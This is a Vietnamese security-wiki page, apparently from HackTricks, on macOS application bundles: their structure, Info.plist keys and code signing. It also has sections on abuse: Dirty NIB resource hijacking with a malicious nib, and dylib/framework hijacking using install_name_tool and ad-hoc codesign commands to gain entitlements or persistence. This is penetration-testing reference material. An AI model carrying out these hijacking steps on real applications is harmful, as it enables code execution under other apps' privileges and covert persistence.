# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## Thông tin cơ bản

Các bundle trong macOS đóng vai trò là vùng chứa nhiều tài nguyên, bao gồm ứng dụng, thư viện và các tệp cần thiết khác, giúp chúng hiển thị trong Finder như một đối tượng duy nhất, chẳng hạn các tệp `*.app` quen thuộc. Bundle thường gặp nhất là `.app`, dù các loại khác như `.framework`, `.systemextension` và `.kext` cũng rất phổ biến.

### Các thành phần thiết yếu của bundle

Bên trong bundle, đặc biệt là trong thư mục `<application>.app/Contents/`, có nhiều tài nguyên quan trọng:

- **\_CodeSignature**: Thư mục này lưu trữ thông tin ký mã cần thiết để xác minh tính toàn vẹn của ứng dụng. Bạn có thể kiểm tra thông tin ký mã bằng các lệnh như:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Chứa binary thực thi của ứng dụng, chạy khi người dùng tương tác.
- **Resources**: Nơi lưu trữ các thành phần giao diện người dùng của ứng dụng, bao gồm hình ảnh, tài liệu và mô tả giao diện (tệp nib/xib).
- **Info.plist**: Đóng vai trò là tệp cấu hình chính của ứng dụng, rất quan trọng để hệ thống nhận diện và tương tác với ứng dụng một cách phù hợp.

#### Các khóa quan trọng trong Info.plist

Tệp `Info.plist` là nền tảng trong việc cấu hình ứng dụng, chứa các khóa như:

- **CFBundleExecutable**: Chỉ định tên của tệp thực thi chính nằm trong thư mục `Contents/MacOS`.
- **CFBundleIdentifier**: Cung cấp mã định danh toàn cục cho ứng dụng, được macOS sử dụng rộng rãi để quản lý ứng dụng.
- **LSMinimumSystemVersion**: Cho biết phiên bản macOS tối thiểu cần có để chạy ứng dụng.

### Khám phá Bundles

Để khám phá nội dung của một bundle, chẳng hạn như `Safari.app`, có thể dùng lệnh sau: `bash ls -lR /Applications/Safari.app/Contents`

Việc khám phá này cho thấy các thư mục như `_CodeSignature`, `MacOS`, `Resources` và các tệp như `Info.plist`. Mỗi thành phần có mục đích riêng, từ bảo vệ ứng dụng đến định nghĩa giao diện người dùng và các tham số vận hành.

#### Các thư mục bổ sung trong Bundle

Ngoài các thư mục phổ biến, bundle cũng có thể chứa:

- **Frameworks**: Chứa các framework đi kèm mà ứng dụng sử dụng. Framework tương tự dylib nhưng có thêm tài nguyên.
- **PlugIns**: Thư mục chứa các plug-in và extension giúp tăng cường khả năng của ứng dụng.
- **XPCServices**: Chứa các dịch vụ XPC mà ứng dụng sử dụng để giao tiếp ngoài tiến trình.

Cấu trúc này đảm bảo tất cả thành phần cần thiết được đóng gói trong bundle, tạo nên môi trường ứng dụng dạng module và an toàn.

Để biết thêm chi tiết về các khóa `Info.plist` và ý nghĩa của chúng, tài liệu dành cho nhà phát triển của Apple cung cấp nhiều thông tin: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).<sup>[[3]](#references)</sup>

## Ghi chú bảo mật & vector lạm dụng

- **Gatekeeper / App Translocation**: Khi bundle bị quarantine được thực thi lần đầu, macOS sẽ xác minh chữ ký chuyên sâu và có thể chạy ứng dụng từ một đường dẫn translocation ngẫu nhiên. Sau khi được chấp nhận, những lần khởi chạy sau chỉ thực hiện kiểm tra sơ bộ; các tệp tài nguyên trong `Resources/`, `PlugIns/`, nib, v.v. trước đây không được kiểm tra. Từ macOS 13 Ventura, hệ thống bắt buộc kiểm tra chuyên sâu ở lần chạy đầu tiên và quyền TCC *App Management* mới hạn chế các tiến trình bên thứ ba sửa đổi bundle khác nếu chưa có sự đồng ý của người dùng, nhưng các hệ thống cũ vẫn dễ bị tấn công.
- **Va chạm Bundle Identifier**: Nhiều target được nhúng (PlugIns, công cụ helper) dùng lại cùng một `CFBundleIdentifier` có thể làm hỏng việc xác thực chữ ký và đôi khi cho phép chiếm quyền/đánh lừa URL scheme. Luôn liệt kê các sub-bundle và xác minh ID là duy nhất.

## Resource Hijacking (Dirty NIB / NIB Injection)

Trước Ventura, việc thay thế tài nguyên giao diện trong ứng dụng đã ký có thể vượt qua kiểm tra sơ bộ của code signing và dẫn đến thực thi mã với entitlements của ứng dụng. Nghiên cứu hiện tại (2024) cho thấy cách này vẫn hoạt động trên các hệ thống trước Ventura và các bản build không bị quarantine:<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup>

1. Sao chép ứng dụng mục tiêu vào vị trí có quyền ghi (ví dụ: `/tmp/Victim.app`).
2. Thay `Contents/Resources/MainMenu.nib` (hoặc bất kỳ nib nào được khai báo trong `NSMainNibFile`) bằng nib độc hại có khởi tạo `NSAppleScript`, `NSTask`, v.v.
3. Khởi chạy ứng dụng. Nib độc hại chạy dưới bundle ID và entitlements của nạn nhân (quyền TCC, microphone/camera, v.v.).
4. Ventura trở lên giảm thiểu rủi ro bằng cách xác minh chuyên sâu bundle khi khởi chạy lần đầu và yêu cầu quyền *App Management* đối với các lần sửa đổi sau, khiến việc duy trì persistence khó hơn. Tuy vậy, các cuộc tấn công khi khởi chạy lần đầu trên macOS cũ vẫn có thể xảy ra.<sup>[[1]](#references)</sup>

Ví dụ payload nib độc hại tối giản (biên dịch xib thành nib bằng `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```

## Framework / PlugIn / dylib Hijacking bên trong Bundles

Vì các lượt tra cứu `@rpath` ưu tiên Frameworks/PlugIns đi kèm bundle, việc thả một thư viện độc hại vào `Contents/Frameworks/` hoặc `Contents/PlugIns/` có thể chuyển hướng thứ tự tải khi binary chính được ký mà không có library validation hoặc có thứ tự `LC_RPATH` yếu.

Các bước thường gặp khi khai thác bundle unsigned/ad-hoc:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Ghi chú:
- Hardened runtime không có `com.apple.security.cs.disable-library-validation` sẽ chặn các dylib của bên thứ ba; hãy kiểm tra entitlements trước.
- Các dịch vụ XPC trong `Contents/XPCServices/` thường tải các framework cùng thư mục — hãy vá các binary của chúng tương tự để tạo persistence hoặc khai thác các đường dẫn privilege escalation.

## Cheatsheet kiểm tra nhanh

```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```

## References

- [1] [Đưa process injection vào tầm nhìn: khai thác ứng dụng macOS bằng nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Bài viết về Dirty NIB và can thiệp tài nguyên bundle (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
- [3] [Apple Developer - Tài liệu tham khảo về khóa Apple Info.plist](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html)
{{#include ../../../banners/hacktricks-training.md}}
